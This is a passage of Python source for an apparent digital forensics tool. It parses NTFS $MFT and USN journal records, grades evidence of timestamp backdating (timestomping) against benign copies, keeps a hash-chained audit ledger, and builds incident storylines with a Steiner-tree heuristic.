            return tl[i - 1][1] if i else tl[0][1], tl[i][1], False
        new_id = self.entities.intern("PROCESS", name, len(tl) + 1)
        self.entities.pinned.add(new_id)
        i = bisect.bisect_right(starts, ts_ns)
        tl.insert(i, (ts_ns, new_id))
        return tl[i - 1][1], new_id, True

    def is_untainted_broker(self, src: int) -> bool:
        # brokers are interned from epoch 1 upward, every other entity at epoch 0 (see resolve())
        return self.entities.epochs[src] == 1 and self.entities.kinds[src] == "PROCESS"

    def gate_q16(self, src: int, rel: int, loss_q16: int = 0) -> int:
        if loss_q16 >= GATE_EXEMPT_LOSS_Q16 or not self.is_untainted_broker(src):
            return Q16
        deg = max(1, self.degree[(src, rel)])
        return GATE_Q16[min(deg.bit_length() - 1, len(GATE_Q16) - 1)]

    def attention_q16(self, src: int, rel: int) -> int:
        deg = self.degree[(src, rel)]
        inv = INV_DEG_Q16[min(deg.bit_length(), len(INV_DEG_Q16) - 1)]
        return (_EXP_PRIOR_Q16[REL_LOG_PRIOR.get(rel, 0.0)] * inv) >> 16

    def gate(self, src: int, rel: int, loss_q16: int = 0) -> float:
        return self.gate_q16(src, rel, loss_q16) / Q16

    def attention(self, src: int, rel: int) -> float:
        return self.attention_q16(src, rel) / Q16


# --------------------------------------------------------------------------- #
# 2.4  NTFS structures and the anti-timestomping matrix                       #
# --------------------------------------------------------------------------- #

MFT_RECORD_SIZE = 1024
ATTR_STANDARD_INFORMATION = 0x10
ATTR_FILE_NAME = 0x30
ATTR_END = 0xFFFFFFFF
USN_REASON_DATA_EXTEND = 0x00000002
USN_REASON_FILE_CREATE = 0x00000100
USN_REASON_BASIC_INFO_CHANGE = 0x00008000
USN_REASON_CLOSE = 0x80000000
USN_V2 = struct.Struct("<IHHQQqqIIIIHH")   # 60-byte USN_RECORD_V2 header
TICKS_PER_SECOND = 10 ** 7


def _resident_attr(attr_type: int, content: bytes, attr_id: int) -> bytes:
    length = (0x18 + len(content) + 7) // 8 * 8
    hdr = struct.pack("<IIBBHHHIHBB", attr_type, length, 0, 0, 0x18, 0, attr_id, len(content), 0x18, 0, 0)
    return (hdr + content).ljust(length, b"\x00")


def build_mft_record(record_number: int, name: str, parent_record: int, si_times: Sequence[int],
                     fn_times: Sequence[int], lsn: int, si_usn: int, sequence: int = 1,
                     parent_sequence: int = 1, size: int = 0, is_dir: bool = False) -> bytes:
    """
    A 1024-byte NTFS FILE record with $STANDARD_INFORMATION and $FILE_NAME, fixups applied.
    si_times / fn_times are FILETIME ticks in on-disk order: created (B), modified (M),
    MFT-entry-modified (C), accessed (A). Used by the self-test and for building test images.
    """
    si = struct.pack("<4QIIIIIIQQ", *si_times, 0x20, 0, 0, 0, 0, 0x100, 0, si_usn)   # 72 bytes, USN @0x40
    fname = name.encode("utf-16-le")
    parent_ref = (parent_sequence << 48) | parent_record
    fn = struct.pack("<Q4QQQII", parent_ref, *fn_times, (size + 4095) // 4096 * 4096, size, 0x20, 0)
    fn += struct.pack("<BB", len(name), 1) + fname
    attrs = _resident_attr(ATTR_STANDARD_INFORMATION, si, 0) + _resident_attr(ATTR_FILE_NAME, fn, 1)
    first_attr = 0x38
    used = first_attr + len(attrs) + 8
    hdr = struct.pack("<4sHHQHHHHIIQHHI", b"FILE", 0x30, 3, lsn, sequence, 1, first_attr,
                      0x01 | (0x02 if is_dir else 0), used, MFT_RECORD_SIZE, 0, 2, 0, record_number)
    rec = bytearray(MFT_RECORD_SIZE)
    rec[0:len(hdr)] = hdr
    rec[first_attr:first_attr + len(attrs)] = attrs
    struct.pack_into("<II", rec, first_attr + len(attrs), ATTR_END, 0)
    usa_value = 0x0001
    usa = [usa_value]
    for i in (1, 2):
        end = i * 512
        usa.append(struct.unpack_from("<H", rec, end - 2)[0])
        struct.pack_into("<H", rec, end - 2, usa_value)
    struct.pack_into("<3H", rec, 0x30, *usa)
    return bytes(rec)


def parse_mft_record(buf: bytes, byte_offset: int = 0) -> Optional[Dict[str, Any]]:
    """Parse one FILE record (fixups verified and undone). Returns None for empty/non-FILE slots."""
    if len(buf) < 0x30 or buf[:4] != b"FILE":
        return None
    usa_off, usa_cnt = struct.unpack_from("<HH", buf, 4)
    rec = bytearray(buf)
    if usa_cnt:
        usa = struct.unpack_from(f"<{usa_cnt}H", rec, usa_off)
        for i in range(1, usa_cnt):
            end = i * 512
            if end > len(rec):
                break
            if struct.unpack_from("<H", rec, end - 2)[0] != usa[0]:
                return {"byte_offset": byte_offset, "error": "FIXUP_MISMATCH (torn or altered record)"}
            struct.pack_into("<H", rec, end - 2, usa[i])
    lsn, = struct.unpack_from("<Q", rec, 0x08)
    seq, _links, first_attr, flags = struct.unpack_from("<HHHH", rec, 0x10)
    record_number, = struct.unpack_from("<I", rec, 0x2C)
    out: Dict[str, Any] = {"byte_offset": byte_offset, "length": len(buf), "sha256": _sha256_hex(bytes(buf)),
                           "record_number": record_number, "sequence": seq, "lsn": lsn,
                           "in_use": bool(flags & 1), "is_dir": bool(flags & 2),
                           "si": None, "si_usn": None, "fn": None, "name": None, "parent_record": None}
    pos = first_attr
    while pos + 8 <= len(rec):
        atype, alen = struct.unpack_from("<II", rec, pos)
        if atype == ATTR_END or alen == 0 or pos + alen > len(rec):
            break
        non_resident = rec[pos + 8]
        if not non_resident:
            clen, coff = struct.unpack_from("<IH", rec, pos + 0x10)
            c = bytes(rec[pos + coff:pos + coff + clen])
            if atype == ATTR_STANDARD_INFORMATION and len(c) >= 0x20:
                out["si"] = dict(zip("BMCA", struct.unpack_from("<4Q", c, 0)))
                if len(c) >= 0x48:
                    out["si_usn"] = struct.unpack_from("<Q", c, 0x40)[0]
            elif atype == ATTR_FILE_NAME and len(c) >= 0x42 and out["fn"] is None:
                parent_ref, = struct.unpack_from("<Q", c, 0)
                out["parent_record"] = parent_ref & 0xFFFFFFFFFFFF
                out["fn"] = dict(zip("BMCA", struct.unpack_from("<4Q", c, 8)))
                nlen = c[0x40]
                out["name"] = c[0x42:0x42 + 2 * nlen].decode("utf-16-le", "replace")
        pos += alen
    return out


def parse_mft(data: bytes, base_offset: int = 0, record_size: int = MFT_RECORD_SIZE) -> List[Dict[str, Any]]:
    out = []
    for off in range(0, len(data) - record_size + 1, record_size):
        r = parse_mft_record(data[off:off + record_size], base_offset + off)
        if r is not None:
            out.append(r)
    return out


def resolve_mft_paths(records: Sequence[Dict[str, Any]], root_record: int = 5, drive: str = "C:") -> Dict[int, str]:
    by_num = {r["record_number"]: r for r in records if r.get("name") is not None}
    paths: Dict[int, str] = {}

    def path_of(n: int, depth: int = 0) -> str:
        if n in paths:
            return paths[n]
        if n == root_record or n not in by_num or depth > 64:
            return drive
        r = by_num[n]
        p = path_of(r["parent_record"], depth + 1) + "\\" + r["name"]
        paths[n] = p
        return p

    for n in sorted(by_num):
        if n != root_record:
            path_of(n)
    return paths


def build_usn_record(usn: int, file_ref: int, parent_ref: int, ts_ticks: int, reason: int, name: str) -> bytes:
    fname = name.encode("utf-16-le")
    length = (USN_V2.size + len(fname) + 7) // 8 * 8
    hdr = USN_V2.pack(length, 2, 0, file_ref, parent_ref, usn, ts_ticks, reason, 0, 0, 0x20, len(fname), USN_V2.size)
    return (hdr + fname).ljust(length, b"\x00")


def build_usn_stream(entries: Sequence[Tuple[int, int, int, int, str]], sparse_prefix: int = 0) -> bytes:
    """entries: (file_ref, parent_ref, ts_ticks, reason, name). USN = offset in the $J stream, as NTFS assigns it."""
    out = bytearray(sparse_prefix)
    for file_ref, parent_ref, ts, reason, name in entries:
        out += build_usn_record(len(out), file_ref, parent_ref, ts, reason, name)
    return bytes(out)


def parse_usn_journal(data: bytes, base_offset: int = 0, stream_offset: int = 0,
                      rollback_tolerance_ns: int = 2 * NS) -> Dict[str, Any]:
    """
    Walk USN_RECORD_V2 records in a $UsnJrnl:$J extent (zero-filled sparse runs skipped).
    Invariant 4: each record's USN must equal its offset in the $J stream and USNs must
    strictly increase; a timestamp running backwards by more than rollback_tolerance_ns is
    reported (clock change or spliced records).
    """
    records, violations, errors = [], [], []
    pos, n = 0, len(data)
    last_usn, last_ts = -1, None
    while pos + 8 <= n:
        rlen = struct.unpack_from("<I", data, pos)[0]
        if rlen == 0:
            pos += 8
            continue
        if rlen < USN_V2.size or rlen % 8 or pos + rlen > n:
            errors.append({"byte_offset": base_offset + pos, "error": f"bad record length {rlen}"})
            pos += 8
            continue
        (_, major, _minor, file_ref, parent_ref, usn, ts, reason, _si, _sec, _attrs,
         name_len, name_off) = USN_V2.unpack_from(data, pos)
        if major != 2:
            errors.append({"byte_offset": base_offset + pos, "error": f"unsupported USN record v{major}"})
            pos += rlen
            continue
        name = data[pos + name_off:pos + name_off + name_len].decode("utf-16-le", "replace")
        raw = data[pos:pos + rlen]
        rec = {"byte_offset": base_offset + pos, "length": rlen, "sha256": _sha256_hex(raw), "usn": usn,
               "file_record": file_ref & 0xFFFFFFFFFFFF, "parent_record": parent_ref & 0xFFFFFFFFFFFF,
               "timestamp_ns": filetime_to_ns(ts), "reason": reason, "name": name}
        expected = stream_offset + pos
        if usn != expected:
            violations.append({"rule": "USN_NOT_EQUAL_STREAM_OFFSET", "byte_offset": rec["byte_offset"],
                               "usn": usn, "expected_usn": expected})
        if usn <= last_usn:
            violations.append({"rule": "USN_NOT_MONOTONIC", "byte_offset": rec["byte_offset"], "usn": usn,
                               "previous_usn": last_usn})
        if last_ts is not None and rec["timestamp_ns"] < last_ts - rollback_tolerance_ns:
            violations.append({"rule": "JOURNAL_TIME_ROLLBACK", "byte_offset": rec["byte_offset"],
                               "timestamp_utc": ns_to_iso(rec["timestamp_ns"]), "previous_utc": ns_to_iso(last_ts)})
        last_usn = max(last_usn, usn)
        last_ts = rec["timestamp_ns"] if last_ts is None else max(last_ts, rec["timestamp_ns"])
        records.append(rec)
        pos += rlen
    creates: Dict[int, Dict[str, Any]] = {}
    for r in records:
        if r["reason"] & USN_REASON_FILE_CREATE and r["file_record"] not in creates:
            creates[r["file_record"]] = r
    return {"records": records, "violations": violations, "errors": errors, "creates": creates,
            "append_only_ok": not violations and not errors}


class _FenwickMax:
    """Prefix maximum of (value, payload) over 1-based ranks."""

    def __init__(self, n: int):
        self.n = n
        self.t: List[Tuple[int, int]] = [(-1 << 62, -1)] * (n + 1)

    def update(self, i: int, item: Tuple[int, int]) -> None:
        while i <= self.n:
            if item > self.t[i]:
                self.t[i] = item
            i += i & -i

    def query(self, i: int) -> Tuple[int, int]:
        best = (-1 << 62, -1)
        while i > 0:
            if self.t[i] > best:
                best = self.t[i]
            i -= i & -i
        return best


class AntiTimestompEngine:
    """
    Five invariants over $MFT FILE records and, when available, $UsnJrnl:$J. Grades:
    PROVEN / STRONG make a file TIMESTOMPED; INDICATIVE only makes it SUSPECT (to be explained
    by the examiner); benign explanations are named rather than flagged.

    I1  $MFT header LSN (0x08) and USN monotonicity: file i is flagged when some j has
        LSN(j) < LSN(i) and USN(j) < USN(i) yet t_SI.B(j) > t_SI.B(i) + delta. PROVEN only when
        both i and the reference j take their USN from the journal's FILE_CREATE record (two
        separate prefix-maximum trees keep the bases apart); with the $SI USN (offset 0x40, the
        *last* change) on either side it is INDICATIVE. Records are compared only within one
        $MFT extent, i.e. one volume; a reformatted or chkdsk-reset $LogFile is a reason the
        INDICATIVE grade exists.
    I2  100-ns fractional ticks: $SI fields at whole seconds while the kernel-kept $FN copy has
        sub-second ticks. FAT32/exFAT copies, tar/zip extraction and old HTTP/FTP tools produce the
        same pattern, so I2 alone is INDICATIVE; it becomes STRONG only when I1 (PROVEN), I3
        (TIMESTOMP_BACKDATE) or I4 (PROVEN) corroborate it on the same file.
    I3  Copy / archive restore / backdate: SI.M < FN.B <= SI.B is a normal copy. SI.B < FN.B with
        SI.C > FN.B means $SI.B was set back after creation; the journal then decides:
          every BASIC_INFO_CHANGE inside the creation session (before the first CLOSE and within
          `session_window_ns` of FILE_CREATE) -> ARCHIVE_EXTRACTION_OR_RESTORE (7-Zip, WinRAR,
          robocopy /COPYALL, DISM restore times through the open handle), INDICATIVE;
          a BASIC_INFO_CHANGE in a later, separate session -> TIMESTOMP_BACKDATE, STRONG;
          no journal for the file -> BACKDATED_SI_UNCORROBORATED, INDICATIVE.
        A tool that stomps through its own still-open write handle is indistinguishable from an
        archiver by these records and is graded accordingly.
    I4  $UsnJrnl:$J append-only order (parse_usn_journal) and FILE_CREATE time vs $SI.B; the
        latter is PROVEN only when I3 found a separate later change, otherwise INDICATIVE.
    I5  t(child) >= t(parent) on graph edges: TemporalProvenanceGraph.check_causality.
    """

    def __init__(self, delta_ns: int = NS, tolerance_ns: int = 2 * NS, session_window_ns: int = 2 * NS):
        self.delta_ns = delta_ns
        self.tolerance_ns = tolerance_ns
        self.session_window_ns = session_window_ns

    @staticmethod
    def _anchor(r: Dict[str, Any]) -> Dict[str, Any]:
        return {"byte_offset": r["byte_offset"], "length": r["length"], "sha256": r["sha256"]}

    # I1
    def invariant1_lsn_usn(self, records: Sequence[Dict[str, Any]],
                           journal_creates: Optional[Dict[int, Dict[str, Any]]] = None) -> List[Dict[str, Any]]:
        rows = []
        for r in records:
            if not r.get("si") or r.get("lsn") is None:
                continue
            jc = (journal_creates or {}).get(r["record_number"])
            usn, basis = (jc["usn"], "USN_JOURNAL_FILE_CREATE") if jc else (r.get("si_usn"), "SI_LAST_USN")
            if usn is None:
                continue
            rows.append((r["lsn"], usn, filetime_to_ns(r["si"]["B"]), r, basis))
        if not rows:
            return []
        ranks = {u: i + 1 for i, u in enumerate(sorted({row[1] for row in rows}))}
        fw_all, fw_journal = _FenwickMax(len(ranks)), _FenwickMax(len(ranks))
        rows.sort(key=lambda x: (x[0], x[1], x[3]["byte_offset"]))
        findings, i = [], 0
        while i < len(rows):
            j = i
            while j < len(rows) and rows[j][0] == rows[i][0]:
                j += 1
            for lsn, usn, tb, r, basis in rows[i:j]:
                hit, grade = None, None
                if basis == "USN_JOURNAL_FILE_CREATE":
                    best_tb, wi = fw_journal.query(ranks[usn] - 1)
                    if wi >= 0 and best_tb > tb + self.delta_ns:
                        hit, grade = (best_tb, wi), "PROVEN"
                if hit is None:
                    best_tb, wi = fw_all.query(ranks[usn] - 1)
                    if wi >= 0 and best_tb > tb + self.delta_ns:
                        hit, grade = (best_tb, wi), "INDICATIVE"
                if hit:
                    w, wbasis = rows[hit[1]][3], rows[hit[1]][4]
                    findings.append(dict(self._anchor(r), invariant=1, rule="ALERT_LSN_USN_BACKDATE", grade=grade,
                                         record=r["record_number"], usn_basis=basis, reference_usn_basis=wbasis,
                                         lsn=lsn, usn=usn, si_created_utc=ns_to_iso(tb),
                                         reference_record=w["record_number"], reference_lsn=w["lsn"],
                                         reference_si_created_utc=ns_to_iso(hit[0])))
            for k in range(i, j):
                lsn, usn, tb, r, basis = rows[k]
                fw_all.update(ranks[usn], (tb, k))
                if basis == "USN_JOURNAL_FILE_CREATE":
                    fw_journal.update(ranks[usn], (tb, k))
            i = j
        return findings

    # I2
    def invariant2_tick_entropy(self, r: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        si, fn = r.get("si"), r.get("fn")
        if not si:
            return None
        zero_si = [k for k in "BMCA" if si[k] and si[k] % TICKS_PER_SECOND == 0]
        zero_fn = [k for k in "BMCA" if fn and fn[k] and fn[k] % TICKS_PER_SECOND == 0]
        if ("B" in zero_si and fn and "B" not in zero_fn) or (len(zero_si) >= 2 and not zero_fn):
            return dict(self._anchor(r), invariant=2, rule="SI_ZERO_FRACTIONAL_TICKS", grade="INDICATIVE",
                        record=r["record_number"], zero_fraction_si_fields=zero_si, zero_fraction_fn_fields=zero_fn,
                        benign_explanations=["FAT32/exFAT copy", "tar/zip extraction", "legacy HTTP/FTP client"])
        return None

    def _session_profile(self, jrecs: Sequence[Dict[str, Any]]) -> Optional[str]:
        if not jrecs:
            return None
        create = next((x for x in jrecs if x["reason"] & USN_REASON_FILE_CREATE), None)
        basic = [x for x in jrecs if x["reason"] & USN_REASON_BASIC_INFO_CHANGE]
        if create is None or not basic:
            return "NO_BASIC_INFO_CHANGE" if create is not None else None
        close = next((x for x in jrecs if x["reason"] & USN_REASON_CLOSE), None)
        inside = all((close is None or b["usn"] <= close["usn"])
                     and b["timestamp_ns"] - create["timestamp_ns"] <= self.session_window_ns for b in basic)
        return "IN_CREATION_SESSION" if inside else "SEPARATE_LATER_CHANGE"

    # I3
    def invariant3_copy_vs_backdate(self, r: Dict[str, Any],
                                    jrecs: Optional[Sequence[Dict[str, Any]]] = None) -> Dict[str, Any]:
        si, fn = r.get("si"), r.get("fn")
        if not si or not fn:
            return {"invariant": 3, "classification": "INCONCLUSIVE", "reason": "missing $SI or $FN"}
        tol = self.tolerance_ns // 100
        profile = None
        if si["B"] < fn["B"] - tol:
            if si["C"] > fn["B"]:
                profile = self._session_profile(jrecs or [])
                cls = {"SEPARATE_LATER_CHANGE": "TIMESTOMP_BACKDATE",
                       "IN_CREATION_SESSION": "ARCHIVE_EXTRACTION_OR_RESTORE"}.get(profile, "BACKDATED_SI_UNCORROBORATED")
            else:
                cls = "INCONCLUSIVE"
        elif si["M"] < fn["B"] <= si["B"] + tol:
            cls = "BENIGN_COPY"
        else:
            cls = "CONSISTENT"
        return {"invariant": 3, "classification": cls, "journal_session": profile, "record": r["record_number"],
                "si_created_utc": ns_to_iso(filetime_to_ns(si["B"])), "si_modified_utc": ns_to_iso(filetime_to_ns(si["M"])),
                "si_mft_changed_utc": ns_to_iso(filetime_to_ns(si["C"])), "fn_created_utc": ns_to_iso(filetime_to_ns(fn["B"]))}

    # I4 (journal vs $SI)
    def invariant4_journal_vs_si(self, r: Dict[str, Any], journal_creates: Dict[int, Dict[str, Any]],
                                 i3_class: Optional[str] = None) -> Optional[Dict[str, Any]]:
        jc = journal_creates.get(r["record_number"])
        if not jc or not r.get("si"):
            return None
        si_b = filetime_to_ns(r["si"]["B"])
        if jc["timestamp_ns"] - si_b > self.tolerance_ns:
            return dict(self._anchor(r), invariant=4, rule="SI_CREATED_BEFORE_JOURNAL_FILE_CREATE",
                        grade="PROVEN" if i3_class == "TIMESTOMP_BACKDATE" else "INDICATIVE",
                        record=r["record_number"], si_created_utc=ns_to_iso(si_b),
                        journal_create_utc=ns_to_iso(jc["timestamp_ns"]), journal_usn=jc["usn"],
                        journal_byte_offset=jc["byte_offset"], journal_length=jc["length"], journal_sha256=jc["sha256"])
        return None

    def assess(self, records: Sequence[Dict[str, Any]], journal: Optional[Dict[str, Any]] = None
               ) -> Dict[str, Any]:
        """Run I1-I4 over parsed records. Returns per-record verdicts and the flat finding list."""
        creates = journal["creates"] if journal else {}
        by_file: Dict[int, List[Dict[str, Any]]] = defaultdict(list)
        for jr in (journal or {}).get("records", []):
            by_file[jr["file_record"]].append(jr)
        live = [r for r in records if r.get("si") and not r.get("error")]
        findings = list(self.invariant1_lsn_usn(live, creates))
        classes = {}
        for r in live:
            c3 = self.invariant3_copy_vs_backdate(r, by_file.get(r["record_number"]))
            classes[r["record_number"]] = c3["classification"]
            if c3["classification"] in ("TIMESTOMP_BACKDATE", "ARCHIVE_EXTRACTION_OR_RESTORE",
                                        "BACKDATED_SI_UNCORROBORATED"):
                findings.append(dict(c3, **self._anchor(r), rule="SI_BACKDATED_BELOW_FN",
                                     grade="STRONG" if c3["classification"] == "TIMESTOMP_BACKDATE" else "INDICATIVE"))
            f4 = self.invariant4_journal_vs_si(r, creates, c3["classification"])
            if f4:
                findings.append(f4)
        strong_files = {f["record"] for f in findings if f.get("grade") in ("PROVEN", "STRONG")}
        for r in live:
            f2 = self.invariant2_tick_entropy(r)
            if f2:
                if r["record_number"] in strong_files:
                    f2["grade"], f2["corroborated"] = "STRONG", True
                findings.append(f2)
        if journal:
            for v in journal["violations"]:
                findings.append(dict(v, invariant=4, grade="STRONG" if v["rule"] != "JOURNAL_TIME_ROLLBACK" else "INDICATIVE"))
        per_record: Dict[int, Dict[str, Any]] = {}
        for r in live:
            n = r["record_number"]
            fs = [f for f in findings if f.get("record") == n]
            strong = [f for f in fs if f.get("grade") in ("PROVEN", "STRONG")]
            cls = classes.get(n)
            if strong:
                verdict = "TIMESTOMPED"
            elif cls in ("ARCHIVE_EXTRACTION_OR_RESTORE", "BENIGN_COPY"):
                verdict = cls
            elif fs:
                verdict = "SUSPECT"
            else:
                verdict = "CONSISTENT"
            per_record[n] = {"verdict": verdict, "invariants_failed": sorted({f["invariant"] for f in fs}),
                             "copy_class": cls}
        findings.sort(key=lambda f: (f.get("byte_offset", 0), f["invariant"], f.get("rule", "")))
        return {"findings": findings, "per_record": per_record,
                "journal_append_only_ok": journal["append_only_ok"] if journal else None}


class AuditLedger:
    """
    Hash-chained, append-only log of every repair or quarantine. The chain starts from a genesis
    value (Sector A's master_case_root_v3 once bound), so it cannot be re-rooted on another case;
    entries optionally carry an HMAC-SHA256 under an examiner key. A chain by itself cannot reveal
    that its tail was cut off: the head digest and entry count are therefore written into
    incident_storyline.json, whose digest goes into the Section 63 certificate (Sector D), and
    verify() checks against them.
    """

    def __init__(self, genesis: str = "0" * 64, key: Optional[bytes] = None):
        self.genesis = genesis
        self.key = key
        self.entries: List[Dict[str, Any]] = []

    def rebase(self, genesis: str) -> None:
        if self.entries:
            raise RuntimeError("audit ledger already has entries; bind Sector A before ingesting evidence")
        self.genesis = genesis

    @property
    def head(self) -> str:
        return self.entries[-1]["entry_sha256"] if self.entries else self.genesis

    def append(self, entry: Dict[str, Any]) -> Dict[str, Any]:
        e = dict(entry, index=len(self.entries), prev_sha256=self.head)
        body = canonical_json(e)
        e["entry_sha256"] = _sha256_hex(body)
        if self.key:
            e["hmac_sha256"] = hmac.new(self.key, body, hashlib.sha256).hexdigest()
        self.entries.append(e)
        return e

    @staticmethod
    def verify(entries: Sequence[Dict[str, Any]], genesis: str = "0" * 64, expected_head: Optional[str] = None,
               expected_count: Optional[int] = None, key: Optional[bytes] = None) -> bool:
        prev = genesis
        for i, e in enumerate(entries):
            body = {k: v for k, v in e.items() if k not in ("entry_sha256", "hmac_sha256")}
            raw = canonical_json(body)
            if e.get("index") != i or e.get("prev_sha256") != prev or _sha256_hex(raw) != e.get("entry_sha256"):
                return False
            if key is not None and not hmac.compare_digest(
                    hmac.new(key, raw, hashlib.sha256).hexdigest(), str(e.get("hmac_sha256", ""))):
                return False
            prev = e["entry_sha256"]
        if expected_count is not None and len(entries) != expected_count:
            return False
        if expected_head is not None and prev != expected_head:
            return False
        return True


# --------------------------------------------------------------------------- #
# 2.5  Deterministic prize-collecting Steiner tree                            #
# --------------------------------------------------------------------------- #

class PCSTStorylineSolver:
    """
    Approximately minimises  sum_{e in T} c(e) + lambda * sum_{v not in T} p(v)  subject to |V_T| <= max_nodes,
    i.e. maximises lambda*prize(T) - cost(T), on the undirected view of the graph.

    Method (greedy shortest-path PCST heuristic, then strong pruning):
      1. per connected component, root = terminal with the largest prize;
      2. repeatedly run multi-source Dijkstra from the tree and attach the terminal with the
         largest net gain lambda*p(t) - dist(t) > 0 whose path keeps the tree within max_nodes;
      3. strong pruning: drop any leaf whose lambda*prize is below the cost of its tree edge;
      4. keep the component with the best net value.
    PCST is NP-hard; this is a deterministic heuristic, not an exact optimum.

    Determinism: costs and prizes are integers (Q16.16); every comparison is on a total order
    whose tie-breaker is the edge's physical byte offset Omega(e), then its source file and
    insertion-order-free node keys. The output therefore does not depend on ingestion order,
    hash seeds or platform.
    """

    def __init__(self, max_nodes: int = 25, lam: float = 2.0):
        if max_nodes < 1:
            raise ValueError("max_nodes >= 1")
        self.max_nodes = max_nodes
        self.lam_q16 = int(round(lam * Q16))

    def _gain(self, prize_q16: int) -> int:
        return (prize_q16 * self.lam_q16) >> 16

    def solve(self, edges: Sequence[Tuple[int, int, int, tuple, Any]], prizes: Dict[int, int],
              node_key: Callable[[int], tuple]) -> Dict[str, Any]:
        """
        edges: (u, v, cost_q16, tie_key, payload); tie_key must start with Omega(e).
        Returns {"nodes", "edges" (payloads), "value", "root", "components"}.
        """
        best_pair: Dict[Tuple[int, int], Tuple[int, tuple, Any]] = {}
        for u, v, c, tie, payload in edges:
            if u == v:
                continue
            a, b = (u, v) if node_key(u) <= node_key(v) else (v, u)
            cand = (c, tie, payload)
            cur = best_pair.get((a, b))
            if cur is None or cand[:2] < cur[:2]:
                best_pair[(a, b)] = cand
        # adjacency lists hold (neighbour, cost, tie) and are kept in neighbour-key order; keys are
        # computed when needed rather than stored per edge, to keep memory near O(edges) small tuples
        adj: Dict[int, List[Tuple[int, int, tuple, Any]]] = defaultdict(list)
        while best_pair:
            (a, b), (c, tie, payload) = best_pair.popitem()
            adj[a].append((b, c, tie, payload))
            adj[b].append((a, c, tie, payload))
        del best_pair

        def pair_edge(a: int, b: int) -> Tuple[int, tuple, Any]:
            return next((c, tie, p) for y, c, tie, p in adj[a] if y == b)

        for v in adj:
            adj[v].sort(key=lambda item: (node_key(item[0]), item[1], item[2]))

        # components, visited in node-key order
        comp_of: Dict[int, int] = {}
        comps: List[List[int]] = []
        for start in sorted(adj, key=node_key):
            if start in comp_of:
                continue
            cid, stack, members = len(comps), [start], []
            comp_of[start] = cid
            while stack:
                x = stack.pop()
                members.append(x)
                for y, _c, _t, _p in adj[x]:
                    if y not in comp_of:
                        comp_of[y] = cid
                        stack.append(y)
            comps.append(sorted(members, key=node_key))
        lone = sorted((v for v, p in prizes.items() if p > 0 and v not in adj), key=node_key)
        for v in lone:
            comps.append([v])

        results = []
        for members in comps:
            terminals = [v for v in members if prizes.get(v, 0) > 0]
            if not terminals:
                continue
            res = self._grow(members, terminals, adj, prizes, node_key)
            omegas = [pair_edge(a, b)[1] for a, b in res["tree_pairs"]]
            res["min_tie"] = min(omegas) if omegas else ()
            res["size"] = len(members)
            results.append(res)
        if not results:
            return {"nodes": [], "edges": [], "value": 0, "root": None, "components": []}
        results.sort(key=lambda r: (-r["value"], r["min_tie"], node_key(r["root"])))
        best = results[0]
        payloads = [pair_edge(a, b)[2] for a, b in best["tree_pairs"]]
        comps_summary = [{"root": r["root"], "value": r["value"], "nodes": r["nodes"], "size": r["size"]}
                         for r in results]
        return {"nodes": best["nodes"], "edges": payloads, "value": best["value"], "root": best["root"],
                "components": comps_summary}

    @staticmethod
    def _pair(a: int, b: int, node_key: Callable[[int], tuple]) -> Tuple[int, int]:
        return (a, b) if node_key(a) <= node_key(b) else (b, a)

    def _grow(self, members, terminals, adj, prizes, node_key) -> Dict[str, Any]:
        root = min(terminals, key=lambda v: (-prizes[v], node_key(v)))
        in_tree = {root}
        parent: Dict[int, Tuple[int, int]] = {}      # child -> (parent, cost)
        while len(in_tree) < self.max_nodes:
            # Dijkstra from the tree, limited to paths that could still fit: a node more than
            # `room` hops out can never be attached, so the search stays local on huge graphs.
            room = self.max_nodes - len(in_tree)
            dist: Dict[int, Tuple[int, tuple]] = {v: (0, ()) for v in in_tree}
            hops: Dict[int, int] = {v: 0 for v in in_tree}
            pred: Dict[int, Tuple[int, int]] = {}
            heap = [(0, (), node_key(v), v) for v in in_tree]
            heapq.heapify(heap)
            done: Set[int] = set()
            while heap:
                d, tie, _k, x = heapq.heappop(heap)
                if x in done:
                    continue
                done.add(x)
                if hops[x] >= room:
                    continue
                for y, c, etie, _p in adj[x]:
                    if y in in_tree or y in done:
                        continue
                    cand = (d + c, etie)
                    if y not in dist or cand < dist[y]:
                        dist[y] = cand
                        hops[y] = hops[x] + 1
                        pred[y] = (x, c)
                        heapq.heappush(heap, (d + c, etie, node_key(y), y))
            options = []
            for t in terminals:
                if t in in_tree or t not in dist:
                    continue
                path = [t]
                while path[-1] not in in_tree:
                    path.append(pred[path[-1]][0])
                new_nodes = len(path) - 1
                gain = self._gain(prizes[t]) + sum(self._gain(prizes.get(v, 0)) for v in path[1:-1]) - dist[t][0]
                options.append((-gain, dist[t][0], dist[t][1], node_key(t), t, path, new_nodes))
            options.sort(key=lambda o: o[:4])
            chosen = None
            for o in options:
                if -o[0] <= 0:
                    break
                if len(in_tree) + o[6] <= self.max_nodes:
                    chosen = o
                    break
            if chosen is None:
                break
            path = chosen[5]
            for i in range(len(path) - 1):
                child, par = path[i], path[i + 1]
                if child not in in_tree:
                    parent[child] = (par, pred[child][1])
                    in_tree.add(child)
        # strong pruning
        changed = True
        while changed:
            changed = False
            children = Counter(p for p, _ in parent.values())
            for v in sorted(list(parent), key=node_key):
                if children[v] == 0 and self._gain(prizes.get(v, 0)) < parent[v][1]:
                    del parent[v]
                    in_tree.discard(v)
                    changed = True
                    break
        value = sum(self._gain(prizes.get(v, 0)) for v in in_tree) - sum(c for _, c in parent.values())
        pairs = sorted((self._pair(c, p, node_key) for c, (p, _) in parent.items()),
                       key=lambda ab: (node_key(ab[0]), node_key(ab[1])))
        return {"root": root, "nodes": sorted(in_tree, key=node_key), "tree_pairs": pairs, "value": value}


# --------------------------------------------------------------------------- #
# Telemetry readers (byte-exact offsets)                                      #
# --------------------------------------------------------------------------- #

def iter_lines_with_offsets(path: str) -> Iterator[Tuple[int, bytes]]:
    """Stream (offset, line without CR/LF) from a file; memory bounded by the longest line."""
    with open(path, "rb") as f:
        off = 0
        for raw in f:
            line = raw.rstrip(b"\r\n")
            if line:
                yield off, line
            off += len(raw)


PCAP_MAGIC = {b"\xd4\xc3\xb2\xa1": ("<", 1000), b"\xa1\xb2\xc3\xd4": (">", 1000),
              b"\x4d\x3c\xb2\xa1": ("<", 1), b"\xa1\xb2\x3c\x4d": (">", 1)}


def iter_pcap_tcp_syns(path: str) -> Iterator[Dict[str, Any]]:
    """
    Stream TCP SYN (no ACK) packets over IPv4/IPv6 from a classic libpcap file (Ethernet or raw IP).
    Each item carries the byte offset and length of the whole packet record (16-byte record
    header + captured bytes), so the anchor covers exactly what Wireshark shows as that frame.
    """
    with open(path, "rb") as f:
        gh = f.read(24)
